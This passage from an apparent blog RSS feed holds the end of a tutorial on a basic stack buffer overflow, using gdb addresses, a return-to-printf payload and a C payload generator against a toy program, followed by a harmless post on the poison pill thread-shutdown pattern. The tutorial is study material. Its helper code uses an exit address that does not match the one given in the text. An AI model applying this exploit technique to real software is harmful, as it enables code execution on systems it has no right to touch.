&lt;p&gt;Did you find the secret? The offset between the return address and the address we are going to write is only &lt;code&gt;0xffffd23c - 0xffffd220 = 0x1C = 28&lt;/code&gt;. This means if our input message is 28 characters or more, then we could overwrite the return address of &lt;code&gt;main&lt;/code&gt; function!&lt;/p&gt;

&lt;p&gt;And let’s remind what return instruction does. It puts the value pointed by &lt;code&gt;esp&lt;/code&gt; to &lt;code&gt;eip&lt;/code&gt;,  increment &lt;code&gt;esp&lt;/code&gt; by 4 bytes, and execute the code pointed by &lt;code&gt;eip&lt;/code&gt;. So this means if we change the value of return address, we could let program go to some surprised place and execute some surprised code!&lt;/p&gt;

&lt;p&gt;Moreover, if we construct our input message using executable code and let the return address go to our code, then we could let program do whatever we want! And this closes our analysis! Bravo!&lt;/p&gt;

&lt;h4 id=&quot;sum-up&quot;&gt;&lt;strong&gt;Sum up&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Let’s put the pieces together. To do a basic buffer overflow attack, we need to…&lt;br /&gt;
1.Find the address where your input message is going to write.&lt;br /&gt;
2.Find the most recent return address that is larger than the address in point 1.&lt;br /&gt;
3.Carefully calculate the offset of these two addresses and design your input message so that they could be executed by CPU to do some surprisingly fun job.&lt;/p&gt;

&lt;h4 id=&quot;lets-hack-our-not-so-robust-program&quot;&gt;&lt;strong&gt;Let’s Hack Our ‘Not-so-Robust’ Program&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;The normal execution of &lt;code&gt;basic&lt;/code&gt; program is prompt exactly same thing as we input. Now we would like it to print &lt;code&gt;I&#39;m hacked!&lt;/code&gt; in a funny way.&lt;/p&gt;

&lt;p&gt;To print something, we still need the built-in &lt;code&gt;print&lt;/code&gt; function in &lt;code&gt;stdlib&lt;/code&gt;. Take a look at assembly code again,&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) p &amp;amp;printf
$2 = (&amp;lt;data variable, no debug info&amp;gt; *) 0xf7e32f60 &amp;lt;printf&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To print something, we need to make sure &lt;code&gt;esp&lt;/code&gt; is pointing to what we want to print (i.e. &lt;code&gt;I&#39;m hacked!&lt;/code&gt; in this case), and then call &lt;code&gt;printf&lt;/code&gt; function! The input message should be like this:&lt;br /&gt;
[several padding to return address] – [address to &lt;code&gt;printf&lt;/code&gt;] – [pointer to hacking message]&lt;/p&gt;

&lt;p&gt;To call the &lt;code&gt;printf&lt;/code&gt; function is easy, we just need to overwrite the return address in &lt;code&gt;main&lt;/code&gt; function with &lt;code&gt;printf&lt;/code&gt; address, which we’ve already figured out as  &lt;code&gt;0xf7e32f60&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Then where is the hacking message? Remember the &lt;code&gt;printf&lt;/code&gt; function print message out until it find a &lt;code&gt;null&lt;/code&gt; terminator. Therefore we could not put the hacking message at front of input message and followed by the padding, since in this way we would print rubbish that we don’t want to. So we have to put them at the end of input message. Thus, the input message should be like this:&lt;br /&gt;
[several padding to return address] – [address to &lt;code&gt;printf&lt;/code&gt;] – [pointer to hacking message] – [hacking message]&lt;/p&gt;

&lt;p&gt;One last thing, we need some padding at after return to &lt;code&gt;printf&lt;/code&gt;, this is because we use &lt;code&gt;printf&lt;/code&gt; function not by “call” but by “return”. As we analyzed before, just before call &lt;code&gt;printf&lt;/code&gt;, we make sure &lt;code&gt;esp&lt;/code&gt; pointing to message we want to print out. But when we use “return” to call a function, it first put &lt;code&gt;esp&lt;/code&gt; to &lt;code&gt;eip&lt;/code&gt; and then pop &lt;code&gt;esp&lt;/code&gt; so that &lt;code&gt;esp&lt;/code&gt; will move up by 4 bytes. Also, the value in this padding is the return address after return from &lt;code&gt;printf&lt;/code&gt;, i.e. the program will try to execute code at the position of this padding value. So we could put an &lt;code&gt;exit&lt;/code&gt; here to let the program stop.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) p &amp;amp;exit
$5 = (&amp;lt;text variable, no debug info&amp;gt; *) 0xf7e17b10 &amp;lt;exit&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Okay! Let’s hack it!&lt;br /&gt;
We know…&lt;br /&gt;
1. The address we are going to write from is: &lt;code&gt;0xffffd220&lt;/code&gt;&lt;br /&gt;
2. The original return address is at: &lt;code&gt;0xffffd23c&lt;/code&gt;&lt;br /&gt;
3. The return address need to overwrite as &lt;code&gt;0xf7e32f60&lt;/code&gt;&lt;br /&gt;
4. The exit address is &lt;code&gt;0xf7e17b10&lt;/code&gt;&lt;br /&gt;
5. And we put hacking message at the end: &lt;code&gt;I&#39;m hacked!&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;So, what we need is:&lt;br /&gt;
&lt;code&gt;0xffffd220&lt;/code&gt; : 28 &lt;code&gt;\x90&lt;/code&gt; as padding&lt;br /&gt;
……&lt;br /&gt;
&lt;code&gt;0xffffd23c&lt;/code&gt; : &lt;code&gt;0xf7e32f60&lt;/code&gt; address to call &lt;code&gt;printf&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;0xffffd240&lt;/code&gt; : &lt;code&gt;0xf7e17b10&lt;/code&gt; address to exit, also as padding&lt;br /&gt;
&lt;code&gt;0xffffd244&lt;/code&gt; : &lt;code&gt;0xffffd248&lt;/code&gt; pointer to printing message&lt;br /&gt;
&lt;code&gt;0xffffd248&lt;/code&gt; : &lt;code&gt;I&#39;m hacked!&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Another important thing we need to keep in mind is, our system is generally small-endian. This means instead of &lt;code&gt;0xf7e32f60&lt;/code&gt; as is human readable, we need to put &lt;code&gt;0x602fe3f7&lt;/code&gt; in our input message. The same thing holds to &lt;code&gt;0xffffd248&lt;/code&gt; and &lt;code&gt;0xf7e17b10&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;So, based on all these analysis. We get our input message:&lt;br /&gt;
28 &lt;code&gt;\x90&lt;/code&gt;  &lt;code&gt;0x602fe3f7&lt;/code&gt; &lt;code&gt;0x107be1f7&lt;/code&gt; &lt;code&gt;0x48d2ffff&lt;/code&gt; &lt;code&gt;I&#39;m hacked!&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;To generate the text we could have a helper program &lt;code&gt;hack&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* basic hack.c */
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char** argv)
{
        int i = 0;
        //padding
        for(i = 0; i &amp;lt; 28; i++)
        {
                printf(&quot;\x90&quot;);
        }
        printf(&quot;\x60\x2f\xe3\xf7&quot;);//address to printf
        printf(&quot;\xa1\x83\x04\x08&quot;);//address to exit
        printf(&quot;\x48\xd2\xff\xff&quot;);//address to print message
        printf(&quot;I&#39;m Hacked!\n&quot;);

        return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then compile it and save to a file &lt;code&gt;hack.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;-bash-4.2$ gcc -o hack hack.c                                                                                      
-bash-4.2$ ./hack &amp;gt; hack.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finally use &lt;code&gt;gdb&lt;/code&gt; to test it!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) r &amp;lt; hack.txt 
Starting program: basic &amp;lt; hack.txt
Hi, I&#39;m server.
you entered: ????????????????????????????`/{H?I&#39;m Hacked!
I&#39;m Hacked![Inferior 1 (process 41057) exited with code 0111]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; At the end of output, it says program exited with code 0111. This means program doesn’t exit normally. This is because the &lt;code&gt;exit&lt;/code&gt; function also use &lt;code&gt;esp&lt;/code&gt; as exit code, but in our program &lt;code&gt;esp&lt;/code&gt; saves address to message. To overcome this problem, we need to use ROP(Return-Oriented-Programming) technique. See following posts!&lt;/p&gt;

&lt;p&gt;Last but not least. If you test this attack without &lt;code&gt;gdb&lt;/code&gt;, you’ll get&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;-bash-4.2$ ./basic &amp;lt; hack.txt 
Hi, I&#39;m server.
you entered: ????????????????????????????`/{H?I&#39;m Hacked!
Segmentation fault (core dumped)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This is because the so-called ASLR(Address Space Layout Randomization) defense technique. We’ll talk about how to overcome this defense in following posts.&lt;/p&gt;

&lt;p&gt;And this ends the very basic Buffer Overflow Attack. Hope you enjoy it!&lt;/p&gt;
</description>
        <pubDate>Sun, 14 Feb 2016 14:38:00 -0500</pubDate>
        <link>http://huangxuan.me/2016/02/14/Secure-Threats-Buffer-Overflow-Attack-Level-0/</link>
        <guid isPermaLink="true">http://huangxuan.me/2016/02/14/Secure-Threats-Buffer-Overflow-Attack-Level-0/</guid>
        
        <category>Buffer Overflow</category>
        
        <category>Secure</category>
        
        
      </item>
    
      <item>
        <title>Poison Pill Pattern</title>
        <description>&lt;h1 id=&quot;poison-pill-pattern&quot;&gt;Poison Pill Pattern&lt;/h1&gt;

&lt;h3 id=&quot;why-need-this&quot;&gt;Why need this?&lt;/h3&gt;
&lt;p&gt;In a producer consumer problem, how could threads know when to stop? If just interrupt all threads abruptly, maybe some jobs in the queue are not handled properly. So we want to find a way to tell all threads that you should stop, and stop decently.&lt;/p&gt;

&lt;h3 id=&quot;how-it-works&quot;&gt;How it works?&lt;/h3&gt;
&lt;p&gt;The idea is extremely simple. When producer wants to stop the service, it sends a special message (poison pill) into the queue and stops it self, when consumer gets this message, it closes it self as well.&lt;/p&gt;

&lt;h3 id=&quot;what-if-multiply-producers-and-multiply-consumers&quot;&gt;What if multiply producers and multiply consumers?&lt;/h3&gt;
&lt;ol&gt;
  &lt;li&gt;If only one producer and consumer, then it’s totally fine.&lt;/li&gt;
  &lt;li&gt;If there are several producers and one consumer, each producer could send a poison pill to consumer and stop itself. When consumer gets same number of poison pills, then it stop running.&lt;/li&gt;
  &lt;li&gt;If there are one producer and several consumers, then producer send poison pills of same number as consumers to queue. Each consumer stops itself when get a poison pill.&lt;/li&gt;
  &lt;li&gt;If there are multiple producers and multiple consumers, then each producer send poison pill of same number as consumers to queue. Each consumer stops itself when get poison pills of same number as producer.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;what-is-the-problem&quot;&gt;What is the problem?&lt;/h3&gt;
&lt;p&gt;This solution suppose producers and consumers know the quantity of each other.&lt;br /&gt;
Also, if we have N producers and M consumers, then number of poison pills will be N*M, which could be large.&lt;/p&gt;

&lt;h3 id=&quot;alternative-solution&quot;&gt;Alternative Solution&lt;/h3&gt;
&lt;p&gt;One alternative solution is we relax the constraints so that consumers could also offer messages into queue, but only when it is trying to stop the whole service.&lt;br /&gt;
On producers’ side, when all producers are going to leave the service, the last producer send a poison pill to the queue. This could be done by several ways, one way is to elect a leader so the leader send the poison pill and then every producer leaves.&lt;br /&gt;
On consumers’ side, when any of consumers get a poison pill, it first the poison pill back to queue and leave the service. So that all consumers will finally leave the service.&lt;br /&gt;
This solution is based on that producers know each other, and consumers know each other, but producers and consumers don’t know each other, which makes more sense in real world.&lt;/p&gt;

&lt;h3 id=&quot;reference&quot;&gt;Reference&lt;/h3&gt;
&lt;ol&gt;
  &lt;li&gt;“Poison Pill Shutdown” in Java Concurrency in Practice&lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Thu, 11 Feb 2016 14:37:00 -0500</pubDate>
        <link>http://huangxuan.me/2016/02/11/poison-pill-pattern/</link>
        <guid isPermaLink="true">http://huangxuan.me/2016/02/11/poison-pill-pattern/</guid>
        
        <category>Design Pattern</category>
        
        <category>Multi-thread</category>
        
        <category>Producer Consumer</category>
        
        
      </item>
    
  </channel>
</rss>
